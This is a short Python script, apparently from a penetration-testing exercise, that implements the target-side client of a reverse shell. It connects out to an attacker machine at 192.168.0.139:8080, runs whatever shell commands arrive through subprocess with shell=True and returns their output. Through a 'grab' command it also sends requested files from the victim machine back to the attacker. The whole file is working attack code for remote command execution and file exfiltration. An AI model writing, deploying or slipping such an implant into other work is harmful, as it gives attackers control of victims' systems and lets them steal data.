#####################
#Target side
#Establish connectivity with attacker server (Kali) (2)
#Once connect, wait for Kali command (3) and send output (4)

import socket
import subprocess
import os

####################
# transfer : send data file into pieces
# input : s socket object, path is file
def transfer(s, path):
        print("ok");
        if os.path.exists(path):
                print("go")
                f=open(path,'rb')
                packet = f.read(1024)
                while len(packet) > 0:
                        s.send(packet)
                        packet=f.read(1024)
                s.send(('DONE').encode()) #info:tag end of file
        else :
                s.send('no file exists'.encode())

####################
# connect : create connectivity with Kali
# no input               
def connect():
	s=socket.socket() 
	#Establish socket with Kali
	s.connect(("192.168.0.139",8080))
	#Waiting for attacker cmd
	while True:
		command =s.recv(1024)
		#if terminate close the loop
		if 'terminate' in command.decode():
			s.close()
			break
		#case if it is a file if attacker do grab*filename
		elif 'grab' in command.decode():
			grab, path = command.decode().split('*')
			try:
				print("begin")
				transfer(s,path)
			except:
				pass
		else : # execute shell Popen class create a new process, pipe will read output, send it to Kali
			CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #, stdin=subprocess.PIPE)
			#s.send(CMD.stdout.read())
			#s.send(CMD.stderr.read())
			output, error = CMD.communicate()
			s.send(output)
			s.send(error)

#####################
#Execute in target side
def main():
	connect()
main()	

